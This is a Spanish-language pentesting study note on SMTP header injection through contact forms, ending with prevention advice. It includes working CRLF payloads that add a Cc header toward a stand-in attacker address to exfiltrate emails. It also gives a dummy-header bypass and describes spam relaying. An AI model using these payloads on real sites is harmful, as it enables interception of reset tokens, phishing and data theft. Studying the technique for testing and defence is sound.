---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - HTTP/CRLF
Fecha de actualización: 2026-07-14
Nota previa: "[[03 - HTTP Response Splitting]]"
Nota siguiente: "[[05 - Prevención y herramientas de CRLF]]"
Area: "[[HTTP Attacks.base|HTTP Attacks]]"
---
---

La **SMTP Header Injection** (o *Email Injection*) aplica la [[01 - Introducción a CRLF Injection|CRLF injection]] al correo. `SMTP` estructura los emails como HTTP —una sección de cabeceras y un cuerpo, separados por líneas— así que si una app refleja input del usuario en una cabecera SMTP (típicamente el remitente o el asunto) sin sanear, <mark style="background: #ADCCFFA6;">el atacante inyecta cabeceras SMTP arbitrarias</mark>.

# Estructura de un email SMTP

```smtp
From: webmaster@smtpinjection.htb
To: admin@smtpinjection.htb
Cc: otro@test.htb
Subject: Testmail

Lorem ipsum dolor sit amet...
.
```

Cabeceras separadas por `CRLF`, una línea en blanco, el cuerpo, y una línea con solo un `.` que termina el mensaje. Las cabeceras que interesan al atacante:

| Cabecera | Uso abusable |
| - | - |
| `From` / `Reply-To` | Spoofing del remitente (phishing) |
| `To` / `Cc` / `Bcc` | <mark style="background: #FFB86CA6;">Añadirte como destinatario para **exfiltrar** el correo</mark> |
| `Subject` | Punto de inyección frecuente |

# Identificación

Un formulario de contacto envía un email al admin, reflejando tu dirección en `From` y tu mensaje en el cuerpo. Se prueba inyectando CRLF en el campo email:

```http
POST /contact.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=evilhacker&email=evil@attacker.htb%0d%0aTestheader:%20Testvalue&phone=123&message=Hi
```

Si el email resultante contiene `Testheader: Testvalue`, hay inyección.

# Explotación

**Exfiltrar el correo (Cc/Bcc).** En real no ves el email generado, así que <mark style="background: #FF5582A6;">te añades como destinatario</mark> para recibirlo — con todo su contenido confidencial:

```http
name=evilhacker&email=evil@attacker.htb%0d%0aCc:%20evil@attacker.htb&phone=123&message=Hi
```

<mark style="background: #FFB86CA6;">Si el correo lleva información sensible (un token, un reset, datos internos), aterriza en tu bandeja</mark>. Con `Bcc` lo haces sin que el destinatario original lo note.

**Spam / mail relay.** Metiendo una lista enorme de destinatarios en `To`/`Cc`/`Bcc` y repitiendo la petición, conviertes el servidor en un relay de spam.

> [!warning] El truco del dummy header
> A veces la app **añade datos** después de tu punto de inyección. Si tu `name` va al `Subject` como `You received a message from <name>!`, ese `!` se pega a tu payload y **invalida** el `Cc` inyectado. La solución: <mark style="background: #FF5582A6;">inyecta una cabecera **dummy** después de tu payload</mark> para que absorba lo que se añada:
> ```http
> email=evil%40attacker.htb%0d%0aCc:%20evil@attacker.htb%0d%0aDummyheader:%20abc
> ```
> El `!` sobrante cae en `Dummyheader` en vez de romper tu `Cc`.

# Contexto profesional y prevención

- **El clásico**: `PHP mail()` con cabeceras en el parámetro `additional_headers` construido a mano con input del usuario. Es el vector de email injection más histórico y aún presente en formularios "contáctanos" y "enviar a un amigo".
- **Impacto real**: interceptar emails con **tokens de reset** (encadena con [[08 - Password Reset Poisoning|password reset poisoning]]), robo de datos, phishing con remitente spoofeado, y abuso como relay.
- **Prevención**: **sanear `CR`/`LF` en todos los campos que vayan a cabeceras SMTP**; usar librerías como **PHPMailer/SwiftMailer** que separan cabeceras de valores en vez de concatenar; validar el formato del email estrictamente (rechaza cualquier `\r`/`\n`).

La caza y las herramientas para todos los vectores CRLF se recogen en [[05 - Prevención y herramientas de CRLF]].

## Referencias

- [OWASP WSTG — Testing for IMAP/SMTP Injection](https://owasp.org/www-project-web-security-testing-guide/)
- [Acunetix — Email Header Injection](https://www.acunetix.com/blog/articles/email-header-injection/)
